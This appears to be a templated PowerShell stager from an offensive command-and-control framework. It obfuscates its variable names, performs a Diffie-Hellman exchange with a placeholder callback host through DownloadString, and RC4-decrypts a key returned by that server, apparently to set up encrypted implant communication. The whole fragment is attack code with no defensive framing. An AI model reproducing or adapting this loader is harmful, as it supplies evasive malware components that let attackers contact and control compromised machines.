${{symbol_name("dh_endpoint")}} = "{{dh_endpoint}}";
${{symbol_name("DH_MODULUS")}} = [bigint]'{{DH_MODULUS}}';
${{symbol_name("DH_G")}} = [bigint]'{{DH_G}}';

${{symbol_name("Client_Secret")}} = ([bigint](Get-Random -Max ([bigint]::Pow(2, 128))));
${{symbol_name("Client_Public")}} = [bigint]::ModPow(${{symbol_name("DH_G")}}, ${{symbol_name("Client_Secret")}}, ${{symbol_name("DH_MODULUS")}});

{{('Write-Debug "DH Endpoint: $'+symbol_name("dh_endpoint")+'"')|debug}}
{{('Write-Debug "DH Modulus: $'+symbol_name("DH_MODULUS")+'"')|debug}}
{{('Write-Debug "Client public: $'+symbol_name("Client_Public")+'"')|debug}}
{{('Write-Debug "Client secret: $'+symbol_name("Client_Secret")+'"')|debug}}

${{symbol_name("response")}} = ${{symbol_name('web_client')}}.DownloadString("{{callback}}${{symbol_name("dh_endpoint")}}/${{symbol_name("Client_Public")}}").Split();

${{symbol_name("Server_Public")}} = [bigint](${{symbol_name("response")}}[0]);
${{symbol_name("encrypted_key")}} = [System.Convert]::FromBase64String(${{symbol_name("response")}}[1]);
{{('Write-Debug "Server public: $'+symbol_name("Server_Public")+'"')|debug}}

${{symbol_name("shared_secret")}} = [bigint]::ModPow(${{symbol_name("Server_Public")}}, ${{symbol_name("Client_Secret")}}, ${{symbol_name("DH_MODULUS")}});
{{('Write-Debug "Shared Secret: $'+symbol_name("shared_secret")+'"')|debug}}
${{symbol_name("shared_secret")}} = ([bigint]${{symbol_name("shared_secret")}}).ToByteArray()[0..63];

{{('Write-Debug "Shared Secret (bytes): $'+symbol_name("shared_secret")+'"')|debug}}
{{('Write-Debug "Encrypted key: $'+symbol_name("encrypted_key")+'"')|debug}}

${{symbol_name("global_key")}} = {{symbol_name("Decrypt-RC4")}} ${{symbol_name("encrypted_key")}} ${{symbol_name("shared_secret")}};
